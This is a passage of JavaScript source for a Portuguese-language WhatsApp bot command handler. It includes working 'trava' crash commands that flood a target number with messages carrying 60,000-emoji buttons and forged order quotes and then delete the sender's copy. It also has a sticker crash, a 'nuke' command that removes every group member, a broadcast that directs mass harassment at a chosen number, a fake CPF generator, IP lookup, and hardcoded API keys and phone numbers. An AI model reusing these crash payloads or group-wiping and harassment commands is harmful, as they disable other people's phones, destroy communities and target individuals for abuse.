{buttonId: `ꪶ͢͜🌈𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟🌈ꫂ`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ ${tekkss}${tekks}`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "120363022697760691@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let abc = await conn.sendMessage(from, fuck, {quoted: selocrash})
await conn.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
return
}
try {
vacilao = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
} catch {
if(q.includes("/")) {
vacilao = q.split("/")[0] || ""
} else {
vacilao = `${args.join(" ").replace(/\D/g,'')}`
}
}
try {
envi = q.split("/")[1].replace(/\D/g,'') || 1
} catch {
envi = 5
}
let id = `${vacilao.replace(/\D/g,'')}`
if(!id) return reply(`Cade o número?`)
let [result] = await conn.onWhatsApp(id)
if(!result) return reply(`Numero inexistente!`)
teks = ""
for (var i = 0; i < 60000; i++) {
teks += "💤"
}
let buttons = [
{buttonId: `ꪶ͢͜😈𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟😈ꫂ`, buttonText: {displayText: teks}, type: 1},
{buttonId: `ꪶ͢͜💦𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟💦ꫂ`, buttonText: {displayText: teks}, type: 1},
{buttonId: `ꪶ͢͜🌈𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟🌈ꫂ`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `𝐋͢𝐔𝐈𝐗 𝑶͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
for (var i = 0; i < Number(envi); i++) {
let abc = await conn.sendMessage(result.jid, fuck, {quoted: selocrash})
await conn.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
await sleep(500)
}
conn.sendMessage(from, {text: `Enviei ${envi} travas para @${result.jid.split("@")[0]}`, mentions: [result.jid]})
} catch (err) {
console.log(err)
reply("Hmm deu algum erro!!")
}
break	

case 'figucrash2': 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
conn.sendMessage(from, {sticker: fs.readFileSync('./pixgratis.webp') 
},{quoted: {
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "0@g.us"
},
"message": {
orderMessage: {
itemCount: 99999999,
status: 20000000000000000,
thumbnail: null,
surface: 20000000000000000000000000000,
message: "🔮 𝐓𝐄𝐀𝐌-𝐒𝐀𝐁𝐑𝐈𝐍𝐀 𝐌𝐀𝐓𝐀𝐍𝐃𝐎 𝐕𝐎𝐂𝐄̂ 𝐄 𝐒𝐄𝐔 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏🥵", 
orderTitle: '',
sellerJid: '0@g.us'
}}, 
contextInfo: {
"forwardingScore":999999,
"isForwarded": true
},
sendEphemeral: true
}})
break

//TRAVAS FIM

case 'packfigu':
case 'packfigurinhas':
addFilter(from)   
anu = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: anu})
anuu = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: anuu})
anuuu = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: anuuu})
anuuuu = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: anuuuu})
anuuuuu = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: anuuuuu})
fig = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: fig})
figu = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: figu})
figuu = await getBuffer(`https://apis.nezsab-apis.xyz/figu?apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, { sticker: figu})
aa = [
  {buttonId: `${prefix}packfigu`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎-𝐏𝐀𝐂𝐎𝐓𝐄🎊'}, type: 1},
  {buttonId: `${prefix}packfinaliz`, buttonText: {displayText: '✰ۜۜ͜͡𝐍𝐀̃𝐎-𝐆𝐄𝐑𝐀𝐑❌'}, type: 1}]
buttonMessage = {
    text: "⌁️ Oiie gatinho(a), enviei 7 figurinhas e talvez eu acabe duplicando e enviando alguma repetida ou falhe o download para você, pois ainda estamos em fase beta neste cmd, desde já obrigado. ♡\n— _Caso deseja mais um pack de figurinhas, selecione um dos botões abaixo qual você desejar:_",
    footer: `${NomeDoBot}`,
    buttons: aa,
    headerType: 1
}
sendMsg =  conn.sendMessage(from, buttonMessage, {quoted: info}) 
break

case 'packfinaliz':
await reply('『❕』 Entendido chefe, não irei gerar outro *pacote de figurinhas* para você.')
break
case 'crash1':
if (!isregistrar && !isGroupAdmins) return reply(enviar.msg.registrar)
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: info})
break 
case 'registrar': //fuciona
case 'registrar':
case 'register':
case 'registra':
case 'registrar':
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
if (isUser) return  reply('você já está registrado')
if (!q.includes('|')) return reply(`Digite da forma correta:\nComando: ${prefix}registrar nome|idade\nExemplo: ${prefix}registrar ${SeuNome}|18`)
if (args.length < 1) return reply(`Como se registrar:\nComando: ${prefix}registrar nome|idade\nExemplo: ${prefix}registrar ${SeuNome}|18`)
const namaUser = q.substring(0, q.indexOf('|') - 0)
const umurUser = q.substring(q.lastIndexOf('|') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return reply(`Digite da forma correta:\nComando: ${prefix}registrar nome|idade\nExemplo: ${prefix}registrar ${SeuNome}|18`)
if (namaUser.length >= 60) return reply(`Seu nome é muito longo`)
if (umurUser > 40) return reply(`Idade máxima é 40 anos`)
if (umurUser < 12) return reply(`Idade mínima é 12 anos`)
veri = sender
try {
ppimg = await bot.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
ppimg = 'https://i.ibb.co/rxPtZS8/foto.jpg'
}
captionnya = 
`    〘 Registrado(a) com sucesso 〙
  Código: ${serialUser}
╭╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╾
╠≽️ Dia: ${date}
╠≽️ Hora: ${hora1}
╠≽️ Nome de usuário: @${sender.split("@")[0]}
╠≽️ Nome de registro: ${namaUser}
╠≽️ Idade: ${umurUser}
╠≽️ Seu link wame: wa.me/${sender.split("@")[0]}
╠≽️ Número: ${sender.split("@")[0]}
╚╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╾
você se registrou, digite ${prefix}menu para listar meus comandos`
daftarimg = await getBuffer(ppimg)
addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
bot.sendMessage(from, daftarimg, image, {quoted: say2, caption: captionnya, contextInfo: {mentionedJid: [sender]}})                    
break

case 'perfil':
try {
ppimg = await conn.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const asLvl = getLevelingLevel(sender)
const ssXp = getLevelingXp(sender)
const dptr = `     「 🔥 ~_*PERFIL*_~ 🌈 」
🗒 *Nome* : *${pushname}*
🪀 *Número* : @${sender.split("@")[0]}
🐂 *Nível gado* : *${nivelgador}${nivelgado2r}%*
📱 *Seu Célular* : ${info.key.id.length > 21 ? 'Android 🤣' : info.key.id.substring(0, 2) == '3A' ? 'IOS😂😂😅' : 'Zap zap web 😂😂☝🏼😅'}
😈 *Nível puta* : *${putar}${putar2}%*
😋 *Nível de gostosura* : *${gostosurar}${gostosurar2}%*
🍼 *Valor do programa* : *R$${programa}*

➻ *~_CONSELHO_~* :
${conselho}`
conn.sendMessage(from, {image: {url: ppimg}, caption: dptr}, {quoted: selo})
break

case 'conselhobiblico':
case 'conselhosbiblico':  
case 'conselhosb':   
case 'conselhob':  
var conselhosb = conselhob[Math.floor(Math.random() * conselhob.length)]   
jr = `${tempo} ${pushname} 

Conselhos Bíblico para você: 

- ${conselhosb} 

> Bot: ${NomeDoBot}
> Grupo: ${groupName}`
await conn.sendMessage(from, {text: jr}, {quoted:info, contextInfo: {"mentionedJid": jr}})
break

case 'tabela':
await conn.sendMessage(from, {text: tabela(prefix, NomeDoBot)}, {quoted: selo})
break 

case 'crash2':
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
await conn.sendMessage(from, {text: destrava2 (prefix)}, {quoted: info})
break 

case 'infovotação':
case 'infovotacao':  
await conn.sendMessage(from, {text: infovotacao(prefix, pushname)}, {quoted: selo})
break

case 'infobemvindo':
case 'infobv':  
await conn.sendMessage(from, {text: infobemvindo(prefix)}, {quoted: selo})
break

case 'tradutor': case 'traduzir':
try {
if(!q) return reply(`-Exemplo: ${alizin𝐎dev + command} dog`)
qq = q.trim()
bla = await translate(qq, {to: 'pt'})
console.log(bla)
blatxt = `👻 *Olá ${pushname} sua palavra/texto foi traduzida(o) com sucesso ->\n\n ${bla.text}*`
conn.sendMessage(from, {text: blatxt}, {quoted: info}).catch(e => {
reply("Erro!")
console.log(e)
})
} catch (e) {
if(String(e).includes(Luix1397)) {
console.log("*API CAIU*")   
} else {
reply('Erro!')
}
}
break
case 'idiomas':
case 'idioma':
txt = `  
IDIOMAS DO GTTS OU DO TRADUTOR

EXEMPLO :

>> ${prefix}gtts pt (texto)

o PT que coloquei, é a linguagem, então pode por no lugar as 2 letras que define a linguagem, iguais os exemplos e os idiomas abaixo.

'af': 'Afrikaans',
'sq': 'Albanian',
'ar': 'Arabic',
'hy': 'Armenian',
'ca': 'Catalan',
'hr': 'Croatian',
'cs': 'Czech',
'da': 'Danish',
'nl': 'Dutch',
'en': 'English',
'eo': 'Esperanto',
'fi': 'Finnish',
'fr': 'French',
'de': 'German',
'el': 'Greek',
'ht': 'Haitian Creole',
'hi': 'Hindi',
'hu': 'Hungarian',
'is': 'Icelandic',
'id': 'Indonesian',
'it': 'Italian',
'ja': 'Japanese',
'ko': 'Korean',
'la': 'Latin',
'lv': 'Latvian',
'mk': 'Macedonian',
'no': 'Norwegian',
'pl': 'Polish',
'pt': 'Portugues',
'ro': 'Romanian',
'ru': 'Russian',
'sr': 'Serbian',
'sk': 'Slovak',
'es': 'Spanish',
'sw': 'Swahili',
'sv': 'Swedish',
'ta': 'Tamil',
'th': 'Thai',
'tr': 'Turkish',
'vi': 'Vietnamese',
'cy': 'Welsh'
 
🔥${setting.NomeDoBot}🔥`

conn.sendMessage(from, {text: txt}, {quoted: selo})
break

case 'infocontador':
await conn.sendMessage(from, {text: infocontador(prefix, pushname)}, {quoted: selo})
break

case 'databoton':
await conn.sendMessage(from, {text: databoton(prefix)}, {quoted: selo})
break

case 'infolistanegra':
await conn.sendMessage(from, {text: infolistanegra(prefix, pushname)}, {quoted: selo})
break

case 'infopalavrão':
case 'infopalavrao':
await conn.sendMessage(from, {text: infopalavrao(prefix, pushname)}, {quoted: selo})
break

case 'infobancarac':
await conn.sendMessage(from, {text: infobancarac(prefix, pushname)}, {quoted: selo})
break

case 'git':
case 'git-bot':  
case 'gitdobot':
case 'gitbot':   
await conn.sendMessage(from, {text: gitdobot(prefix)}, {quoted: selo})
break

//========(FUNÇÕES-PREMIUM-AQUI)=======\\

case 'ler': 
case 'ocr':   
case 'lerfoto':  
if (!isPremium && !SoDono) return reply("Só usuário premium pode utilizar este comando..") 
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
media = rane 
reply(enviar.espere)
await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
.then(teks => {
reply(teks.trim())
fs.unlinkSync(media)
})
.catch(err => {
reply(err.message)
fs.unlinkSync(media)
})
} else {
reply('Somente fotos!')
}
break

case 'premiumlist':
if(!isPremium) return reply(enviar.msg.premium)   
tkks = '╭────*「 *PREMIUM USER👑* 」\n'
for (let V of premium) {
tkks += `│+  @${V.split('@')[0]}\n`
}
tkks += `│+ Total : ${premium.length}\n╰──────*「 *${setting.NomeDoBot}* 」*────`
reply(tkks.trim())
break

case 'nuke': case 'arquivargp':
if(!SoDono && !isnit) return reply("Só dono pode utilizar este comando...")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta função.')
if(info.key.fromMe) return 
function banirtodos() {
var r_banirtodos = Math.floor(Math.random() * groupMembers.length + 0)
nmrbot = botNumber.split("@")[0]
var resp = `${groupMembers[r_banirtodos].id.split("@")[0]}`
if(resp === setting.numerodono || resp === nmrbot) {
return
} else {
conn.groupParticipantsUpdate(from, [resp + "@s.whatsapp.net"], 'remove')
}
}
myinterval = setInterval(banirtodos, 1000)
if(groupMembers.length <= 2) {
clearInterval(myinterval);
}
break
case 'tempcrash':
if (!SoDono) return reply('vc nn é meu dono')
templateButtons = [
    {index: 1, urlButton: {displayText: '™ 𝑫𝜜𝑹𝑲✞', url: 'https://api.whatsapp.com/send?phone=+5517996690040&text=Salve%20Dark'}},
    {index: 2, urlButton: {displayText: '🌹⃢⃟𝐃͢𝐀𝐑͢𝐊⁹⁹⁹𖤐⁩᭄(Carlos)', url: 'https://api.whatsapp.com/send?phone=+557999398421&text=Salve%20Dark'}},
    {index: 3, urlButton: {displayText: '⏤͟͞©ᴿᶦᶜᵏ', url: 'https://api.whatsapp.com/send?phone=+558192372750&text=Salve%20Rick'}},
    {index: 4, urlButton: {displayText: '⭐ Star Baileys on GitHub!', url: 'wa.me/5517996690040&text=Salve%20Dark'}},
    {index: 5, urlButton: {displayText: '⭐ Star Baileys on GitHub!', url: 'wa.me/5517996690040&text=Salve%20Dark'}},
    {index: 6, urlButton: {displayText: '⭐ Star Baileys on GitHub!', url: 'wa.me/5517996690040&text=Salve%20Dark'}},
]

templateMessage = {
    text: "Créditos aos meus criadores",
    footer: `${NomeDoBot}`,
    templateButtons: templateButtons
}

conn.sendMessage(`${q}@s.whatsapp.net`, templateMessage)
break
case 'getquoted':
case 'getinfo':  
case 'get':  
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 3))
break

case 'get-txt':  
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation, null, 2))
break

case 'qnt-emoji':

emj = "🈵" 

emj2 = "♠️️"

emj3 = "⚙️" 

emj4 = "👁" 

emj5 = "⛓" 

emj6 = "🐞" 

emj7 = "🌐" 

emj8 = "🦈" 

emj9 = "❄️" 

emj10 = "🌳" 

emj11 = "㊗️" 

emj12 = "🌀" 

emj13 = "❇️" 

emj14 = "🔮"

bld = [] 

bld.push({"🈵": comForEach(mrc, emj)})

bld.push({"♠️️": comForEach(mrc, emj2)})

bld.push({"⚙️": comForEach(mrc, emj3)})

bld.push({"👁": comForEach(mrc, emj4)})

bld.push({"⛓": comForEach(mrc, emj5)})

bld.push({"🐞": comForEach(mrc, emj6)})

bld.push({"🌐": comForEach(mrc, emj7)})

bld.push({"🦈": comForEach(mrc, emj8)})

bld.push({"❄️": comForEach(mrc, emj9)})

bld.push({"🌳": comForEach(mrc, emj10)})

bld.push({"㊗️": comForEach(mrc, emj11)})

bld.push({"🌀": comForEach(mrc, emj12)})

bld.push({"❇️": comForEach(mrc, emj13)})

bld.push({"🔮": comForEach(mrc, emj14)})

reply(JSON.stringify(bld, null, 2))
break

case 'id':
case 'figuid':
if (!SoDono && !info.key.fromMe) return 
if (isQuotedSticker) {
var figu = info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64");
reply(figu)
}
break

case 'gerarcpf':
if(!isPremium) return reply(enviar.msg.premium)
cp1 = `${Math.floor(Math.random() * 300) + 600}`
cp2 = `${Math.floor(Math.random() * 300) + 600}`
cp3 = `${Math.floor(Math.random() * 300) + 600}`
cp4 = `${Math.floor(Math.random() * 30) + 60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
await conn.sendMessage(from, {text: `CPF gerado com sucesso : ${cpf}`}, {quoted: info})
break

case 'cep':
if(!isPuxadas) return reply(`Este tipo de comando só pode ser utilizado com o ${prefix}Puxas 1 ativo, fale com meu dono para alugar`)
conn.sendMessage(from, { react: { text: `🔎`, key: info.key }})
    reply(`💠Olá ${pushname}, Estou enviando as informações⚡`)
   fref = await fetchJson(`https://api.brizaloka-api.tk/consulta/cep?apikey=brizaloka&cep=${q}`)
   textt = `════════════════════
🔍 *CONSULTA DE CEP* 🔍
════════════════════

• Cep: ${fref.resultado.cep}
• Logradouro: ${fref.resultado.logradouro}
• Complemento: ${fref.resultado.complemento}
• Bairro: ${fref.resultado.bairro}
• Localidade: ${fref.resultado.localidade}
• Uf: ${fref.resultado.uf}
• Ibge: ${fref.resultado.ibge}
• Gia: ${fref.resultado.gia}
• Ddd: ${fref.resultado.ddd}
• Siafi: ${fref.resultado.siafi}

🔛 BY: LUIX BOT

━━━━━━━━━━━━━━━━━━`
conn.sendMessage(from, {text: textt}, {quoted: info})
break

case 'metadinha':
try {
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/metadinha?apikey=@Luix1397`);
conn.sendMessage(from, {image: {url: ABC.link1}}).catch(e => {
return reply("Erro..")
})
conn.sendMessage(from, {image: {url: ABC.link2}}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break
case 'ip':
if(!isPuxadas) return reply(`Este tipo de comando só pode ser utilizado com o ${prefix}Puxas 1 ativo, fale com meu dono para alugar`)
//CASE E DESIGNER CRIADO POR ©CARLOS/JESQUINHA-MD
reply(`Olá ${pushname}, Estou enviando as informações no seu privado`)
xereca = await fetchJson(`https://api.brizaloka-api.tk/consulta/ip?apikey=brizaloka&ip=${q}`)
textt = `════════════════════
🔍 *CONSULTA DE IP* 🔍
════════════════════

• Ip Informado: ${xereca.resultado.ip_informado}
• País: ${xereca.resultado.pais}
• Código Do País: ${xereca.resultado.codigo_pais}
• Região: ${xereca.resultado.regiao}
• Código Da Região: ${xereca.resultado.codigo_regiao}
• Cidade: ${xereca.resultado.cidade}
• Código Postal: ${xereca.resultado.codigo_postal}
• Latitude: ${xereca.resultado.latitude}
• Longitude: ${xereca.resultado.longitude}
• Fuso Horário: ${xereca.resultado.fuso_horario}
• Provedora: ${xereca.resultado.provedora}
• Empresa: ${xereca.resultado.empresa}
• As: ${xereca.resultado.as}

🔛 BY: LUIX BOT

━━━━━━━━━━━━━━━━━━`
conn.sendMessage(from, {text: textt}, {quoted: info})
break
case 'upatk':
					if (args.length < 1) return reply('🔸ㅤ                                             POR FAVOR INSIRA O NÚMERO DO ALVO NESTE FORMATO ⏹️  ㅤ                            ㅤ                                                                     ㅤ                            ㅤ             🪓   .upatk 55999999  ‼️                    ㅤ                            ㅤ                                   ❕não use "." "-" "_" ou qualquer outro caractere❕ ')
					anu = await conn.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					buff = await black.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					conn.sendMessage(_.jid, buff, image, {caption: `     [     ]     \n\n${body.slice(5)}`})
					}
					enviar('❗ATAQUE ENVIADO❗')
					 } else {
					for (let _ of anu) {
					sendMess(

_.jid,
` 
    🆙 • ATAQUE DE UP❕

[◾] MANDEM UP PARA ESSE NUMERO ABAIXO! ⬇️

 👤 ⟩⟩api.whatsapp.com/send/?phone=${body.slice(7)}&text=.

  🔥 ⟩⟩      Prints no meu privado!     `)
}
enviar('‼️ATK ENVIADO PARA TODOS OS GRUPOS‼️')
}
break

case 'menuhentai': case 'hentais': case 'menuhentai': {
sections = [
{title: "🇱 🇮 🇸 🇹 🇦   🇩 🇪   🇭 🇪 🇳 🇹 🇦 🇮 🇸 ",
rows: [
{title: "✰ۜۜ͜͡𝐌𝐀𝐒𝐓𝐔𝐑𝐁𝐀𝐓𝐈𝐎𝐍🔞", rowId: `${prefix}masturbation`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐉𝐀𝐇𝐘🔞", rowId: `${prefix}jahy`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐋𝐀𝐒𝐒𝐄𝐒🔞", rowId: `${prefix}glasses`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐀𝐍𝐆-𝐁𝐀𝐍𝐆🔞", rowId: `${prefix}gangbang`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐎𝐎𝐓🔞", rowId: `${prefix}foot`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐄𝐌𝐃𝐎𝐌🔞", rowId: `${prefix}femdom`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐔𝐌🔞", rowId: `${prefix}cum`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐑𝐎🔞", rowId: `${prefix}ero`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐔𝐂𝐊𝐎𝐋𝐃🔞", rowId: `${prefix}cuckold`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐋𝐎𝐖𝐉𝐎𝐁🔞", rowId: `${prefix}blowjob`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐃𝐒𝐌🔞", rowId: `${prefix}bdsm`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐇𝐄𝐆𝐀𝐎🔞", rowId: `${prefix}ahegao`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐄𝐌𝐃𝐎𝐌🔞", rowId: `${prefix}femdom`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐒𝐒🔞", rowId: `${prefix}ass`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎𝐑𝐆𝐘🔞", rowId: `${prefix}orgy`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐀𝐍𝐓𝐈𝐄𝐒🔞", rowId: `${prefix}panties`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐈𝐍𝐆𝐇𝐒🔞", rowId: `${prefix}thinghs`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐔𝐑𝐈-𝐏𝐎𝐑𝐍🔞", rowId: `${prefix}yuri`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐄𝐍𝐓𝐀𝐂𝐋𝐄𝐒🔞", rowId: `${prefix}tentacles`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐒𝐅𝐖-𝐍𝐄𝐊𝐎🔞", rowId: `${prefix}nsfwneko`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐔𝐒𝐒𝐘🔞", rowId: `${prefix}pussy`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐅𝐖-𝐍𝐄𝐊𝐎🔞", rowId: `${prefix}sfwneko`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐙𝐄𝐓𝐓𝐀𝐈𝐑𝐘𝐎𝐔𝐈𝐊𝐈🔞", rowId: `${prefix}zettairyouiki`, description: `${NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Todos os hentais serão enviados\nno pv do usuário que solicitar.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐌𝐄𝐍𝐔 𝐇𝐄𝐍𝐓𝐀𝐈𝐒ꫂ`,
  buttonText: "🔞𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🔞",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo})
}
break
case 'packstickers':
case 'carrinhofig': {
sections = [
{title: "🇫 🇮 🇬 🇺 🇷 🇮 🇳 🇭 🇦 🇸",
rows: [
{title: "✰ۜۜ͜͡𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐌𝐄𝐌𝐄𝐒😆", rowId: `${prefix}figmeme`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐀𝐍𝐈𝐌𝐄𝐒🎎", rowId: `${prefix}fig-anime`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐃𝐄𝐒𝐄𝐍𝐇𝐎𝐒📺", rowId: `${prefix}fig-desenho`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐀 𝐂𝐎𝐑𝐄𝐀𝐍𝐀🇰🇷", rowId: `${prefix}fig-coreana`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐄𝐌𝐎𝐉𝐈𝐒🤪", rowId: `${prefix}fig-emoji`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐃𝐄 𝐑𝐀𝐈𝐕𝐀🤬", rowId: `${prefix}fig-raiva`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐄𝐍𝐆𝐑𝐀𝐂𝐀𝐃𝐎𝐒🤣", rowId: `${prefix}figuengracado`, description: `${NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Olá *${pushname}*, selecione\no tema de sticker que vc deseja.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐂𝐀𝐑𝐑𝐈𝐍𝐇𝐎-𝐃𝐄-𝐅𝐈𝐆𝐔ꫂ`,
  buttonText: "☄️𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑☄️️",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'fig-meme':
case 'figmeme':
case 'fig-memes':
case 'figumeme':
const memez = `${Math.floor(Math.random() * 130)}`
const memep = `${Math.floor(Math.random() * 130)}`
const memei = `${Math.floor(Math.random() * 130)}`
const memex = `${Math.floor(Math.random() * 130)}`
popopoc = fs.readFileSync(`./figurinhas/Figurinha-meme/${memez}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/Figurinha-meme/${memep}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/Figurinha-meme/${memei}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/Figurinha-meme/${memex}.webp`)
